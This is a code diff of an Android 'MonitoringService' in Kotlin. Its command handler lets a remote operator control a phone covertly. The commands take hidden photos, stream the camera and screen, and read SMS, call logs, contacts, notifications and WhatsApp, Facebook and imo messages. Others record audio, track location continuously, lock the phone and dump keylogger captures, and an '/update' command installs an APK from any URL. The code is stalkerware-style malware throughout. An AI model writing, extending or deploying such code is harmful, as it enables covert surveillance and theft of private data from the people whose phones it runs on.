@@ -201,176 +201,179 @@ class MonitoringService : LifecycleService() {
     }
 
     private fun handle(raw: String) {
-        val cmd = raw.lowercase()
-        val arg = raw.substringAfter(' ', "").trim()
-        when {
-            cmd == "/ping" -> sendMsg("🏓 Pong! App is alive\n\nCameras:\n" + CameraHelper.listCameras(this))
-            cmd == "/cam" -> photo(true)
-            cmd == "/selfie" -> photo(false)
-            cmd == "/livecam" -> live(true, arg.toIntOrNull() ?: 30)
-            cmd == "/liveselfie" -> live(false, arg.toIntOrNull() ?: 30)
-            cmd == "/stop" -> { liveJob?.cancel(); sendMsg("⏹ Live stopped") }
-            cmd == "/screen" -> screen()
-            cmd == "/livescreen" -> liveScreen(arg.toIntOrNull() ?: 30)
-            cmd == "/location" -> location()
-            cmd == "/battery" -> battery()
-            cmd == "/sms" -> sms()
-            cmd == "/calls" -> calls()
-            cmd == "/gallery" -> gallery()
-            cmd == "/flash" -> flash()
-            cmd == "/vibrate" -> vibrate()
-            cmd == "/toast" -> toast(arg)
-            cmd == "/whatsapp" -> showMessages("whatsapp")
-            cmd == "/fb" -> showMessages("fb")
-            cmd == "/imo" -> showMessages("imo")
-            cmd == "/usage" -> appUsage()
-            cmd == "/notifications" -> showNotifications()
-            cmd == "/contacts" -> contacts()
-            cmd == "/lock" -> lockPhone("")
-            cmd == "/lockscreen" -> lockPhone(arg)
-            cmd == "/record" -> {
-    val sec = arg.toIntOrNull() ?: 30
-    VoiceRecorder.startRecording(this, sec) { status ->
-        sendMsg(status)
-    }
-}
-cmd == "/block" -> {
-    if (arg.isEmpty()) {
-        sendMsg("❌ Usage: /block [app name]\n\nExample: /block Temple Run")
-    } else {
-        val pkg = AppBlocker.findPackageByName(this, arg)
-        if (pkg != null) {
-            AppBlocker.blockApp(this, pkg)
-            sendMsg("🚫 Blocked: $arg\n📦 $pkg")
-        } else {
-            sendMsg("❌ App not found: $arg")
-        }
-    }
-}
-cmd == "/unblock" -> {
-    if (arg.isEmpty()) {
-        sendMsg("❌ Usage: /unblock [app name]")
-    } else {
-        val pkg = AppBlocker.findPackageByName(this, arg)
-        if (pkg != null) {
-            AppBlocker.unblockApp(this, pkg)
-            sendMsg("✅ Unblocked: $arg\n📦 $pkg")
-        } else {
-            AppBlocker.unblockApp(this, arg)
-            sendMsg("✅ Unblocked: $arg")
-        }
-    }
-}
-cmd == "/blocked" -> {
-    val list = AppBlocker.getBlockedList(this)
-    if (list.isEmpty()) {
-        sendMsg("📋 No apps blocked")
-    } else {
-        val pm = packageManager
-        val sb = StringBuilder("🚫 Blocked Apps (${list.size})\n━━━━━━━━━━━━━━━━━━\n")
-        for (pkg in list) {
-            val name = try {
-                pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
-            } catch (_: Exception) { pkg }
-            sb.append("📱 $name\n🔗 $pkg\n\n")
-        }
-        sendMsg(sb.toString())
-    }
-}
-cmd == "/unblockall" -> {
-    AppBlocker.clearAll(this)
-    sendMsg("✅ All apps unblocked")
-}
-cmd == "/autoshot" -> {
-    when (arg.lowercase()) {
-        "on" -> {
-            AutoScreenshot.setEnabled(this, true)
-            sendMsg("📸 Auto-screenshot ON (${AutoScreenshot.getCount(this)} photos per app open)")
-        }
-        "off" -> {
-            AutoScreenshot.setEnabled(this, false)
-            sendMsg("📸 Auto-screenshot OFF")
-        }
-        else -> {
-            val status = if (AutoScreenshot.isEnabled(this)) "ON" else "OFF"
-            sendMsg("📸 Auto-screenshot: $status\n\nUsage:\n/autoshot on\n/autoshot off")
-        }
-    }
-}
-cmd == "/livetrack" -> {
-    when (arg.lowercase()) {
-        "on" -> {
-            LiveLocationTracker.start(this)
-            sendMsg("📍 Live Location ON — 15 min intervals, 24h")
-        }
-        "off" -> {
-            LiveLocationTracker.stop(this)
-            sendMsg("📍 Live Location OFF")
-        }
-        else -> {
-            val status = if (LiveLocationTracker.isActive(this)) "ON" else "OFF"
-            sendMsg("📍 Live Location: $status\n\nUsage:\n/livetrack on\n/livetrack off")
-        }
-    }
-}
-cmd == "/keys" -> {
-    val keys = KeyloggerService.getKeys(this, 50)
-    if (keys.isEmpty()) {
-        sendMsg("⌨️ No keys captured yet")
-    } else {
-        val sb = StringBuilder("⌨️ Keylogger (Last ${keys.size})\n━━━━━━━━━━━━━━━━━━\n")
-        for ((app, text, time) in keys) {
-            val fmt = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
-            sb.append("📱 $app\n${text.take(200)}\n🕐 ${fmt.format(java.util.Date(time))}\n\n")
-        }
-        sendMsg(sb.toString())
-    }
-}
-            cmd == "/daily" -> sendDailySummary()
-            cmd == "/clearmsgs" -> {
-                MessageStore.clearAll(this)
-                MessageStore.clearNotifications(this)
-                sendMsg("🗑 All stored messages cleared")
+    val cmd = raw.lowercase()
+    val arg = raw.substringAfter(' ', "").trim()
+    when {
+        cmd == "/ping" -> sendMsg("🏓 Pong! App is alive\n\nCameras:\n" + CameraHelper.listCameras(this))
+        cmd == "/cam" -> photo(true)
+        cmd == "/selfie" -> photo(false)
+        cmd == "/livecam" -> live(true, arg.toIntOrNull() ?: 30)
+        cmd == "/liveselfie" -> live(false, arg.toIntOrNull() ?: 30)
+        cmd == "/stop" -> { liveJob?.cancel(); sendMsg("⏹ Live stopped") }
+        cmd == "/screen" -> screen()
+        cmd == "/livescreen" -> liveScreen(arg.toIntOrNull() ?: 30)
+        cmd == "/location" -> location()
+        cmd == "/battery" -> battery()
+        cmd == "/sms" -> sms()
+        cmd == "/calls" -> calls()
+        cmd == "/gallery" -> gallery()
+        cmd == "/flash" -> flash()
+        cmd == "/vibrate" -> vibrate()
+        cmd == "/toast" -> toast(arg)
+        cmd == "/whatsapp" -> showMessages("whatsapp")
+        cmd == "/fb" -> showMessages("fb")
+        cmd == "/imo" -> showMessages("imo")
+        cmd == "/usage" -> appUsage()
+        cmd == "/notifications" -> showNotifications()
+        cmd == "/contacts" -> contacts()
+        cmd == "/lock" -> lockPhone("")
+        cmd == "/lockscreen" -> lockPhone(arg)
+        cmd == "/record" -> {
+            val sec = arg.toIntOrNull() ?: 30
+            VoiceRecorder.startRecording(this, sec) { status ->
+                sendMsg(status)
             }
-            cmd == "/update" -> {
-                if (arg.isNotEmpty() && arg.startsWith("http")) {
-                    updateApp(arg)
+        }
+        cmd == "/block" -> {
+            if (arg.isEmpty()) {
+                sendMsg("❌ Usage: /block [app name]\n\nExample: /block Temple Run")
+            } else {
+                val pkg = AppBlocker.findPackageByName(this, arg)
+                if (pkg != null) {
+                    AppBlocker.blockApp(this, pkg)
+                    sendMsg("🚫 Blocked: $arg\n📦 $pkg")
                 } else {
-                    sendMsg("❌ Usage: /update [APK URL]")
+                    sendMsg("❌ App not found: $arg")
                 }
             }
-            cmd == "/version" -> sendMsg("📱 Version: 1.0\nPackage: $packageName")
-            cmd == "/help" -> sendMsg(
-    "📋 Commands:\n\n" +
-    "📷 /cam /selfie\n" +
-    "🔴 /livecam [sec] /liveselfie [sec]\n" +
-    "⏹ /stop\n" +
-    "📸 /screen /livescreen [sec]\n" +
-    "📍 /location\n" +
-    "🔋 /battery\n" +
-    "💬 /sms /calls /gallery\n" +
-    "📊 /usage\n" +
-    "🔔 /notifications\n" +
-    "👥 /contacts\n" +
-    "🔒 /lock /lockscreen [msg]\n" +
-    "📈 /daily\n" +
-    "💬 /whatsapp /fb /imo\n" +
-    "🎙 /record [sec]\n" +
-    "🚫 /block [app]\n" +
-    "✅ /unblock [app]\n" +
-    "📋 /blocked\n" +
-    "🗑 /unblockall\n" +
-    "📸 /autoshot on/off\n" +
-    "📍 /livetrack on/off\n" +
-    "⌨️ /keys\n" +
-    "🗑 /clearmsgs\n" +
-    "🔆 /flash\n" +
-    "📳 /vibrate\n" +
-    "💬 /toast [msg]\n" +
-    "🔄 /update [url]\n" +
-    "📱 /version\n" +
-    "🏓 /ping"
-)
+        }
+        cmd == "/unblock" -> {
+            if (arg.isEmpty()) {
+                sendMsg("❌ Usage: /unblock [app name]")
+            } else {
+                val pkg = AppBlocker.findPackageByName(this, arg)
+                if (pkg != null) {
+                    AppBlocker.unblockApp(this, pkg)
+                    sendMsg("✅ Unblocked: $arg\n📦 $pkg")
+                } else {
+                    AppBlocker.unblockApp(this, arg)
+                    sendMsg("✅ Unblocked: $arg")
+                }
+            }
+        }
+        cmd == "/blocked" -> {
+            val list = AppBlocker.getBlockedList(this)
+            if (list.isEmpty()) {
+                sendMsg("📋 No apps blocked")
+            } else {
+                val pm = packageManager
+                val sb = StringBuilder("🚫 Blocked Apps (${list.size})\n━━━━━━━━━━━━━━━━━━\n")
+                for (pkg in list) {
+                    val name = try {
+                        pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
+                    } catch (_: Exception) { pkg }
+                    sb.append("📱 $name\n🔗 $pkg\n\n")
+                }
+                sendMsg(sb.toString())
+            }
+        }
+        cmd == "/unblockall" -> {
+            AppBlocker.clearAll(this)
+            sendMsg("✅ All apps unblocked")
+        }
+        cmd == "/autoshot" -> {
+            when (arg.lowercase()) {
+                "on" -> {
+                    AutoScreenshot.setEnabled(this, true)
+                    sendMsg("📸 Auto-screenshot ON (${AutoScreenshot.getCount(this)} photos per app open)")
+                }
+                "off" -> {
+                    AutoScreenshot.setEnabled(this, false)
+                    sendMsg("📸 Auto-screenshot OFF")
+                }
+                else -> {
+                    val status = if (AutoScreenshot.isEnabled(this)) "ON" else "OFF"
+                    sendMsg("📸 Auto-screenshot: $status\n\nUsage:\n/autoshot on\n/autoshot off")
+                }
+            }
+        }
+        cmd == "/livetrack" -> {
+            when (arg.lowercase()) {
+                "on" -> {
+                    LiveLocationTracker.start(this)
+                    sendMsg("📍 Live Location ON — 15 min intervals, 24h")
+                }
+                "off" -> {
+                    LiveLocationTracker.stop(this)
+                    sendMsg("📍 Live Location OFF")
+                }
+                else -> {
+                    val status = if (LiveLocationTracker.isActive(this)) "ON" else "OFF"
+                    sendMsg("📍 Live Location: $status\n\nUsage:\n/livetrack on\n/livetrack off")
+                }
+            }
+        }
+        cmd == "/keys" -> {
+            val keys = KeyloggerService.getKeys(this, 50)
+            if (keys.isEmpty()) {
+                sendMsg("⌨️ No keys captured yet")
+            } else {
+                val sb = StringBuilder("⌨️ Keylogger (Last ${keys.size})\n━━━━━━━━━━━━━━━━━━\n")
+                for ((app, text, time) in keys) {
+                    val fmt = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
+                    sb.append("📱 $app\n${text.take(200)}\n🕐 ${fmt.format(java.util.Date(time))}\n\n")
+                }
+                sendMsg(sb.toString())
+            }
+        }
+        cmd == "/daily" -> sendDailySummary()
+        cmd == "/clearmsgs" -> {
+            MessageStore.clearAll(this)
+            MessageStore.clearNotifications(this)
+            sendMsg("🗑 All stored messages cleared")
+        }
+        cmd == "/update" -> {
+            if (arg.isNotEmpty() && arg.startsWith("http")) {
+                updateApp(arg)
+            } else {
+                sendMsg("❌ Usage: /update [APK URL]")
+            }
+        }
+        cmd == "/version" -> sendMsg("📱 Version: 1.0\nPackage: $packageName")
+        cmd == "/help" -> sendMsg(
+            "📋 Commands:\n\n" +
+            "📷 /cam /selfie\n" +
+            "🔴 /livecam [sec] /liveselfie [sec]\n" +
+            "⏹ /stop\n" +
+            "📸 /screen /livescreen [sec]\n" +
+            "📍 /location\n" +
+            "🔋 /battery\n" +
+            "💬 /sms /calls /gallery\n" +
+            "📊 /usage\n" +
+            "🔔 /notifications\n" +
+            "👥 /contacts\n" +
+            "🔒 /lock /lockscreen [msg]\n" +
+            "📈 /daily\n" +
+            "💬 /whatsapp /fb /imo\n" +
+            "🎙 /record [sec]\n" +
+            "🚫 /block [app]\n" +
+            "✅ /unblock [app]\n" +
+            "📋 /blocked\n" +
+            "🗑 /unblockall\n" +
+            "📸 /autoshot on/off\n" +
+            "📍 /livetrack on/off\n" +
+            "⌨️ /keys\n" +
+            "🗑 /clearmsgs\n" +
+            "🔆 /flash\n" +
+            "📳 /vibrate\n" +
+            "💬 /toast [msg]\n" +
+            "🔄 /update [url]\n" +
+            "📱 /version\n" +
+            "🏓 /ping"
+        )
+        else -> sendMsg("❓ Unknown: $raw")
+    }
+    }
             
     // ===== App Usage Report =====
     private fun appUsage() {
